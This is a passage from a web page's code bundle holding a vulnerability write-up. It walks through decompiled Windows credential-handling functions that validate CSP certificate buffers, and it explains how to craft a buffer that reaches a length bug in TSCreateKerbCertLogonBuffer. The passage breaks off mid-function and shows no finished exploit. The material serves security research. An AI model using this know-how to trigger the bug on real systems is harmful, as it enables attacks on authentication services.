#F92672">**</span><span style="color: #FD971F">a7</span><span style="color: #F8F8F2">)</span></div><div class='line dim'><span style="color: #F8F8F2">&#123;</span></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> _certLen;</span></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">size_t</span><span style="color: #F8F8F2"> __certLen;</span></div><div class='line dim'><span style="color: #F8F8F2">  ... </span><span style="color: #88846F">// Other variables declaration</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">  status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> TSGlobalLsaFunctions-&gt;</span><span style="color: #A6E22E">ImpersonateClient</span><span style="color: #F8F8F2">();</span></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">  &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">    v12 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)</span><span style="color: #A6E22E">TSAllocate</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">0x</span><span style="color: #AE81FF">E8</span><span style="color: #F92672">uLL</span><span style="color: #F8F8F2">);</span></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line dim'><span style="color: #F8F8F2">    v14 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> certData;</span></div><div class='line highlight'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( certData </span><span style="color: #F92672">&&</span><span style="color: #F8F8F2"> (_certLen </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> certLen) </span><span style="color: #F92672">!=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">      status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSGetCspDetailFromCspData</span><span style="color: #F8F8F2">(certLen, certData, (TS_CSPDATA_DETAIL </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(v12 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">50</span><span style="color: #F8F8F2">));</span></div><div class='line dim'><span style="color: #F8F8F2">      ... </span><span style="color: #88846F">// Cleanup on error</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    ...</span></div><div class='line'></div><div class='line dim'><span style="color: #F8F8F2">    status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSDuplicateStringEx</span><span style="color: #F8F8F2">((UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">24</span><span style="color: #F8F8F2">), username, v16);</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">    &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">      status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSDuplicateStringEx</span><span style="color: #F8F8F2">((UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">8</span><span style="color: #F8F8F2">), domain, v19);</span></div><div class='line dim'><span style="color: #F8F8F2">      </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">      &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">        status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSDuplicatePassword</span><span style="color: #F8F8F2">((UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">), password);</span></div><div class='line dim'><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line dim'><span style="color: #F8F8F2">        &#123;</span></div><div class='line dim'><span style="color: #F8F8F2">          </span><span style="color: #A6E22E">LODWORD</span><span style="color: #F8F8F2">(__certLen) </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> _certLen;</span></div><div class='line highlight'><span style="color: #F8F8F2">          status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSCreateKerbCertLogonBuffer</span><span style="color: #F8F8F2">(</span></div><div class='line highlight'><span style="color: #F8F8F2">                     (UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">),</span></div><div class='line highlight'><span style="color: #F8F8F2">                     (UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">8</span><span style="color: #F8F8F2">),</span></div><div class='line highlight'><span style="color: #F8F8F2">                     (UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)(v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">24</span><span style="color: #F8F8F2">),</span></div><div class='line highlight'><span style="color: #F8F8F2">                     v14,</span></div><div class='line highlight'><span style="color: #F8F8F2">                     __certLen,</span></div><div class='line highlight'><span style="color: #F8F8F2">                     (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">**</span><span style="color: #F8F8F2">)v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">19</span><span style="color: #F8F8F2">,</span></div><div class='line highlight'><span style="color: #F8F8F2">                     (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">);</span></div><div class='line dim'><span style="color: #F8F8F2">          ... </span><span style="color: #88846F">// Cleanup on error</span></div><div class='line dim'><span style="color: #F8F8F2">        &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">      &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">    &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #F92672">goto</span><span style="color: #F8F8F2"> LABEL_7;</span></div><div class='line dim'><span style="color: #F8F8F2">  &#125;</span></div><div class='line dim'><span style="color: #F8F8F2">LABEL_9:</span></div><div class='line dim'><span style="color: #F8F8F2">  ... </span><span style="color: #88846F">// Cleanup</span></div><div class='line dim'><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> status;</span></div><div class='line dim'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,cs,rl,nn="These validations ensure that the certificate data adheres to the Windows-specific certificate format known as <strong>CSP (Cryptographic Service Provider)</strong>. This format is composed of two parts: a <strong>header</strong> and a <strong>body</strong>(CSP data). In this context, <strong>CSP data</strong> refers to the information within the certificate that identifies and links it to its corresponding private key provider.",Ws,X,en='<a href="#crafting-a-valid-csp-buffer">Crafting a valid CSP buffer</a>',Vs,ns,an="The <code>TSGetCspDetailFromCspData</code> function first verifies that the CSP buffer is at least 0x30 bytes in size, 0x28 bytes for the header(10 DWORDs) + 1 padding DWORD + 1 <strong>Data Area</strong> DWORD.",Ss,Al,An=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line'><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> __fastcall </span><span style="color: #A6E22E">TSGetCspDetailFromCspData</span><span style="color: #F8F8F2">(</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">certLen</span><span style="color: #F8F8F2">,</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">certData</span><span style="color: #F8F8F2">,</span></div><div class='line'><span style="color: #F8F8F2">        TS_CSPDATA_DETAIL </span><span style="color: #F92672">*</span><span style="color: #FD971F">a3</span><span style="color: #F8F8F2">)</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">  ... </span><span style="color: #88846F">// Variables declaration</span></div><div class='line'></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( </span><span style="color: #F92672">!</span><span style="color: #F8F8F2">certData </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> certLen </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">30</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">!</span><span style="color: #F8F8F2">a3 )</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000000D</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #A6E22E">memset_0</span><span style="color: #F8F8F2">(a3, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">48</span><span style="color: #F92672">uLL</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">  status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSRelocateCspString</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">((DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">6</span><span style="color: #F8F8F2">), (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData, certLen, </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v13, </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line'><span style="color: #F8F8F2">  &#123;</span></div><div class='line'><span style="color: #F8F8F2">    status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSRelocateCspString</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">((DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span><span style="color: #F8F8F2">), (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData, certLen, </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v10, </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">      status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSRelocateCspString</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">((DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">8</span><span style="color: #F8F8F2">), (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData, certLen, </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v11, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">      </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line'><span style="color: #F8F8F2">      &#123;</span></div><div class='line'><span style="color: #F8F8F2">        _status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSRelocateCspString</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">*</span><span style="color: #F8F8F2">((DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">9</span><span style="color: #F8F8F2">), (</span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData, certLen, </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v12, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">        v3 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v12;</span></div><div class='line'><span style="color: #F8F8F2">        status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> _status;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( _status </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2"> )</span></div><div class='line'><span style="color: #F8F8F2">          status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">TSBuildCspDetail</span><span style="color: #F8F8F2">(v13, v10, v11, v12, </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">((DWORD </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)certData </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">5</span><span style="color: #F8F8F2">), a3);</span></div><div class='line'><span style="color: #F8F8F2">      &#125;</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">  &#125;</span></div><div class='line'><span style="color: #F8F8F2">  ... </span><span style="color: #88846F">// Cleanup</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> status;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,js,ml,Cl="After this initial check, the function delegates further validation to <code>TSRelocateCspString</code>. This includes:",xs,il,on="<li>Checking the <strong>providerName</strong> value (located at <strong>header[5]</strong>).</li> <li>Validating the offset from which the string starts within the <strong>Data Area</strong> (located at <strong>header[6]</strong>).</li>",cl,tn,pn=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line'><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> __fastcall </span><span style="color: #A6E22E">TSRelocateCspString</span><span style="color: #F8F8F2">(</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">a1</span><span style="color: #F8F8F2">,               </span><span style="color: #88846F">// Offset into the input buffer</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">a2</span><span style="color: #F8F8F2">,             </span><span style="color: #88846F">// Pointer to a buffer (CSP blob)</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">a3</span><span style="color: #F8F8F2">,      </span><span style="color: #88846F">// Total size of that buffer</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">**</span><span style="color: #FD971F">a4</span><span style="color: #F8F8F2">,  </span><span style="color: #88846F">// [out] Receives pointer to newly allocated wide string</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">a5</span><span style="color: #F8F8F2">)               </span><span style="color: #88846F">// Flag</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">  ... </span><span style="color: #88846F">// Variables declaration</span></div><div class='line'></div><div class='line'><span style="color: #F8F8F2">  v5 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( </span><span style="color: #F92672">!</span><span style="color: #F8F8F2">a4 </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">!</span><span style="color: #F8F8F2">a2 </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> a3 </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">30</span><span style="color: #F8F8F2"> )</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000000D</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">a4 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( </span><span style="color: #F92672">!</span><span style="color: #F8F8F2">a1 </span><span style="color: #F92672">&&</span><span style="color: #F8F8F2"> a5 )</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  v8 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2"> a1;    </span><span style="color: #88846F">// Offset in bytes</span></div><div class='line'><span style="color: #F8F8F2">  v9 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> a2 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">;   </span><span style="color: #88846F">// Data/String area</span></div><div class='line'><span style="color: #F8F8F2">  v10 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> a3 </span><span style="color: #F92672">-</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">40</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( v8 </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> v10 )</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000000D</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  v11 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v9[v8];</span></div><div class='line'><span style="color: #F8F8F2">  v12 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">&</span><span style="color: #F8F8F2">v9[v10];</span></div><div class='line'><span style="color: #F8F8F2">  v13 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v11;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( v11 </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> v12 )</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000000D</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">while</span><span style="color: #F8F8F2"> ( </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2"> )</span></div><div class='line'><span style="color: #F8F8F2">  &#123;</span></div><div class='line'><span style="color: #F8F8F2">    v14 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">v13;</span></div><div class='line'><span style="color: #F8F8F2">    v5 </span><span style="color: #F92672">+=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    v15 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v13 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( </span><span style="color: #F92672">!</span><span style="color: #F8F8F2">v14 </span><span style="color: #F92672">&&</span><span style="color: #F8F8F2"> v15 </span><span style="color: #F92672">&lt;</span><span style="color: #F8F8F2"> v12 </span><span style="color: #F92672">&&</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">!*</span><span style="color: #F8F8F2">v15 )</span></div><div class='line'><span style="color: #F8F8F2">      </span><span style="color: #F92672">break</span><span style="color: #F8F8F2">;   </span><span style="color: #88846F">// Found double-null terminator =&gt; End of wide string</span></div><div class='line'><span style="color: #F8F8F2">    v13 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v15 </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( v13 </span><span style="color: #F92672">&gt;=</span><span style="color: #F8F8F2"> v12 )</span></div><div class='line'><span style="color: #F8F8F2">      </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000000D</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  &#125;</span></div><div class='line'><span style="color: #F8F8F2">  v16 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v5;</span></div><div class='line'><span style="color: #F8F8F2">  v17 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">short</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">)</span><span style="color: #A6E22E">TSAllocate</span><span style="color: #F8F8F2">(v5);</span></div><div class='line'><span style="color: #F8F8F2">  v18 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v17;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> ( v17 )</span></div><div class='line'><span style="color: #F8F8F2">  &#123;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #A6E22E">memcpy_0</span><span style="color: #F8F8F2">(v17, v11, v16);</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">*</span><span style="color: #F8F8F2">a4 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> v18;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F92672">LL</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">  &#125;</span></div><div class='line'><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">0x</span><span style="color: #AE81FF">C000009A</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,ys,yl,Fn="<strong>Note</strong>: There are no restrictions on the length of the <strong>Data Area</strong> section!",ds,vs,rn,Ms,zs,cn='<a href="#triggering-the-bug">Triggering the bug</a>',$s,dl,yn="The buffer format is finalized and passed to the vulnerable function <code>TSCreateKerbCertLogonBuffer</code>.",r,g,Wn=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" c="true"><div class="language-id">c</div><div class='code-container'><code><div class='line dim'><span style="color: #66D9EF">int64_t</span><span style="color: #F8F8F2"> __fastcall </span><span style="color: #A6E22E">TSCreateKerbCertLogonBuffer</span><span style="color: #F8F8F2">(</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">struct</span><span style="color: #F8F8F2"> UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">password</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">struct</span><span style="color: #F8F8F2"> UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">domain</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">struct</span><span style="color: #F8F8F2"> UNICODE_STRING </span><span style="color: #F92672">*</span><span style="color: #FD971F">username</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">certData</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">size_t</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">certLen</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">char</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">**</span><span style="color: #FD971F">a6</span><span style="color: #F8F8F2">,</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">*</span><span style="color: #FD971F">a7</span><span style="color: #F8F8F2">)</span></div><div class='line dim'><span style="color: #F8F8F2">&#123;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> totalLength;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> __totalLength;</span></div><div class='line dim'><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">unsigned</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">int</span><span style="color: #F8F8F2"> _Size;</span></div><div class='line dim'><span style="color: #F8F8F2">    ... </span><span style="color: #88846F">// Other variables declaration</span></div><div class='line'></div><div class='line highlight'><span style="color: #F8F8F2">    </span><span style="color: #88846F">// Calculate total length (aligned)</span></div><div class='line highlight'><span style="color: #F8F8F2">    totalLength </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (domain-&gt;Length </span><span style="color: #F92672">+</span><span style="color: 